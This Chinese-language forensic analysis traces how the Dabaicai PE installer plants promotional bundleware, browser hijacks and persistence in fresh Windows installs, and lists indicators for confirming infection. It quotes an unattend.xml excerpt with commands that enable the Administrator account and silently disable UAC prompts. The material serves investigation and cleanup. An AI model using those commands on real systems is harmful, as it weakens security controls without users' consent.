# 大白菜 PE 装机捆绑机理（证据链版）

> 目的：让排查有据可依。每一条行为都标注对应的落地痕迹，便于工具与人工双向核对。
> 可信度分级：**A 官方**、**B 厂商安全研究**、**C 社区逆向/实测**、**D 未证实推测**。只把 A–C 写进特征库。

---

## 一、一句话结论

大白菜的问题不是"装完系统后才混进来的软件"，而是**装机工具在 PE 阶段就把推广部署程序塞进新系统**，
由 Windows 无人值守文件在首次开机时自动拉起，安装完自删。因此：

- 用微软原版纯净 ISO **同样会中招**——ISO 是干净的，脏的是 PE。
- 装完再删属于**治标**：能清掉已落地的软件与劫持，但下一次用同一支 U 盘装系统还会复发。
- 治本只有两个方向：**去源头**（改 PE 镜像 / 取消赞助商后重做启动盘）或**换工具**（微PE、优启通 + 官方 ISO + Rufus）。

---

## 二、五个阶段

### 阶段 A｜制作 U 盘：推广配置写进镜像

| 行为 | 落地痕迹 | 可信度 |
|---|---|---|
| 默认勾选「赞助商主页（早期为 999.com）」「绿色软件」 | 制作器个性设置页；不点「保存设置」不生效 | A |
| 推广配置与软件包被写入 PE 镜像的隐藏分区 | U 盘 UD 区 / EFI 隐藏区里的 `\PE\DBC8x64.ISO`、`DBC8x64.WIM` | B/C |
| 装机过程把来源信息写进注册表，便于渠道结算 | `HKLM\SOFTWARE\DaBaiCai`（`Version`、`FileName`、`UniqueCode`）+ 子键 `Soft` 里的渠道号 | C（本机实证） |

`Soft` 子键的典型内容（本机实测，2026-11 装机）：

```
DriveTheLife=57459      Taobao=cbdh956        chaojituzi=lm
2345explorer=511097     360se=5000783         EdgeSetup=1773998236
360safe=5000782         Chrome=1773998236
```

这组数字不是版本号，是**推广联盟的渠道/计费 ID**。它同时证明三件事：
装机来源、被推广的软件清单、以及"这不是随机流氓软件而是商业化推广"。

> 动机闭环（官方数据，可信度 A）：2345 装机联盟公开计费——加速浏览器 3.2–6.6 元/台、
> 网址导航按访问用户终身计费 50–65 积分/访问、WPS 0.3 元/台、爱奇艺 0.4 元/台。
> 装一台机器的软件分成约 2–10 元，导航分成是长期现金流。

### 阶段 B｜PE 启动：解包出部署程序

| 行为 | 落地痕迹 | 可信度 |
|---|---|---|
| `X:\windows\Packages\System32.7z`（约 5087 KB）、`PF.7z` 在 PE 运行时解压 | PE 内 `X:\Windows\System32\` 出现 `NUML0CK.EXE` | C（解包实测） |
| 部署程序常驻内存，监听系统还原动作；按关键词删除 PE / 目标盘里的安全软件 | 目标系统里安全软件"无故消失" | B（火绒报告） |
| 从 UD 区 `\IUQD\IMGS\Important.IMG` 挂载载荷 | `Y:\Install\Important.DAT` | C（同类样本） |

`NUML0CK.EXE` 是 **AutoIt 脚本编译 + 混淆**的可执行程序（火绒定性为病毒）；
PE 模式下删安全软件，非 PE 模式下改浏览器首页与收藏夹。

### 阶段 C｜释放镜像：随机名启动器 + 加密分包

| 行为 | 落地痕迹 | 可信度 |
|---|---|---|
| 在 `C:\Windows\<8–16 位随机字母>\` 放随机名启动器 | 样例 `C:\Windows\Uexqgrydo\Wmdnbc.exe`；本机实测 `C:\Windows\Vmaprlfxn\` | C |
| 同目录预置 11 个加密安装包：9 个 `.img/.img1…9` + 2 个 `.ext`（WPS、爱奇艺） | 本机实测 10 个 `SUPPORT.IMG*` 分片，合计 **450.3 MB** | C（本机实证） |
| 预置各浏览器的"默认安装文件夹"与收藏夹文件，使浏览器装完即带推广书签 | `C:\Users\<u>\Favorites` 出现「大白菜官网.URL」等 | B/C |
| 写 `C:\Windows\Panther\unattend.xml`（注意：实际文件名是 `unattend.xml`，不是 `unattended.xml`） | 见下节字段表 | C |

#### unattend.xml 的关键字段

```xml
<RunSynchronous>
  <RunSynchronousCommand wcm:action="add">
    <Order>1</Order>
    <Path>cmd /c net user Administrator /active:yes</Path>          <!-- 启用内置管理员 -->
    <Description>EnableAdmin</Description>
  </RunSynchronousCommand>
  <RunSynchronousCommand wcm:action="add">
    <Order>2</Order>
    <Path>cmd /c net user Administrator ploc /active:yes</Path>     <!-- 启用 ploc 账户 -->
    <Description>EnableAdmin_ploc</Description>
  </RunSynchronousCommand>
  <RunSynchronousCommand wcm:action="add">
    <Order>3</Order>
    <Path>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
          /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f</Path> <!-- 关 UAC 提示 -->
  </RunSynchronousCommand>
  <!-- …首次登录自动运行 C:\<随机名>\<随机名>.exe -->
</RunSynchronous>
```

为什么要关 UAC：启动器要静默提权装软件。若弹 UAC 而用户点了「否」，整条链路就断了。
**所以「UAC 被关」本身就是一条强旁证。**

本机实测：`unattend.xml` 2583 字节，写入时间 = 系统安装时间（2026-11-03 10:21），
命中 `RunSynchronousCommand`×8、`FirstLogonCommands`×2、`ConsentPromptBehaviorAdmin`×2、
`net user Administrator`×2、ploc 账户、随机名启动器路径。

#### 反删除的自我修复（可信度 C，含推测）

社区逆向记录：删掉随机名目录后重启，会出现一段"准备设备 100% 后长时间黑屏"，
期间目录与 `unattend.xml` **被重新生成，且随机名改变了**。作者推测是替换了 `explorer.exe`。
更稳妥的解释是 `specialize` 阶段的 `RunSynchronous` 还有别的入口在执行。
**结论对操作有指导意义**：想彻底断链，必须在 PE 里同时删掉「随机名目录 + unattend.xml」，
而不能只删目录，也不能在已进桌面后删。

### 阶段 D｜首次进桌面：静默安装

| 行为 | 落地痕迹 | 可信度 |
|---|---|---|
| 静默安装推广软件 | 安装日期集中在装机当天；`Soft` 键里的渠道号一一对应 | A/C |
| 改浏览器主页、新标签页、收藏夹、默认搜索 | `initial_preferences`、`Preferences.session.startup_urls`、`Sessions\Tabs_*` | C（本机实证） |
| 在 D 盘落 PE 主程序、桌面放快捷方式 | `D:\大白菜PE`、桌面 lnk | C |
| 启动器安装完自删 | 目录里只剩加密分包，exe 消失 | C |

典型推广清单（合并多来源 + 本机实证）：

- **360 全家桶**：安全卫士、杀毒、安全浏览器、软件管家、驱动大师
- **2345 系**：加速浏览器、安全卫士、看图王、好压、输入法、游戏大厅
- **视频/音乐**：腾讯视频、爱奇艺、酷我音乐、腾讯手游助手
- **办公/工具**：WPS Office、电脑管家、鲁大师、驱动人生/精灵、快压
- **内容类**：老黄历万年历、各类"装机必备"合集包

### 阶段 E｜持续复发

| 机制 | 位置 | 说明 |
|---|---|---|
| 计划任务 | `taskschd.msc` | 定时检查本体是否还在，缺失则重新下载 |
| WMI 永久事件订阅 | `root\subscription` | 比计划任务更隐蔽，Autoruns 的 WMI 页签才看得到 |
| 浏览器组策略键 | `Policies\Microsoft\Edge` / `Google\Chrome` | 导致设置项变灰、改不动 |
| 安全软件"主页锁定" | 360/2345 自带的浏览器保护 | 你在浏览器里改了，它秒改回去 |
| **浏览器会话恢复** | `Sessions\Tabs_*` | 最容易被忽略：只改启动设置没用，旧会话会把标签带回来 |
| 云端复活 | 各软件更新器 | 断网再清理是关键 |

---

## 三、为什么"改了设置还复发"——三层劫持模型

浏览器启动页最终由**三层**决定，优先级从高到低：

```
① 策略层   HKLM/HKCU\SOFTWARE\Policies\...\Edge  (HomepageLocation / RestoreOnStartup / RestoreOnStartupURLs)
              ↑ 最高优先级，界面设置被灰化
② 配置层   <InstallDir>\initial_preferences     ← 首次运行配置，官方安装不带
           User Data\<Profile>\Preferences      ← session.startup_urls / homepage
              ↑ 用户可见的「启动时」设置
③ 会话层   User Data\<Profile>\Sessions\Tabs_* / Session_*
              ↑ 冷启动恢复会话时，把旧标签原样带回
```

三层的排查顺序必须是 **①→②→③**，且第 ③ 层要求**先把浏览器进程全部退出**，
否则浏览器退出时会把当前标签重新写回会话文件，白干。

> 本机实证：`initial_preferences` 里写着
> `"homepage":"http://by.2354mt.com/"`、`"session":{"restore_on_startup":4,"startup_urls":["http://by.2354mt.com/"]}`，
> 该域名 301 跳到 `www.2345.com/?41308`；`Sessions\Tabs_*` 里同一 URL 出现 23 次，
> 时间戳正是"每天第一次打开浏览器"的时刻。

---

## 四、三个"看起来像但不是"的坑

1. **`.NET Framework NGEN` 计划任务**：逆向记录里出现过它的 TaskCache GUID，
   但它就是系统自带的 NGEN 维护任务，**不是 IOC**。拿 GUID 当特征会大面积误报。
2. **`C:\ProgramData\360sd` 可能是你自己装的 360 留下的**，也可能是推广装的。
   判据是安装日期与装机日是否重合，而不是"有 360 目录就是中毒"。
3. **系统代理被改成 `127.0.0.1:7897` 且 Override 排除了全部内网段**——
   这几乎一定是**你自己的代理工具**，不是流氓软件。工具只会报告，不会改。

---

## 五、判断"这台机器是不是大白菜装的"的四个硬指标

按证据强度排序，命中任意两条即可确认：

1. `HKLM\SOFTWARE\DaBaiCai` 存在，且有 `FileName`（镜像名）/ `Soft`（渠道号）。
2. `C:\Windows\Panther\unattend.xml` 的写入时间 ≈ 系统安装时间，且含 `RunSynchronous` + 关 UAC。
3. `C:\Windows\` 下有 8–16 位随机字母目录，里面是 `.img/.ext` 分包（几百 MB）。
4. 安装日期窗口内集中出现的 360/2345 系软件，与 `Soft` 键里的渠道号对应得上。

四条全中 = 证据链完整；只有第 4 条 = 可能只是你自己装的软件。
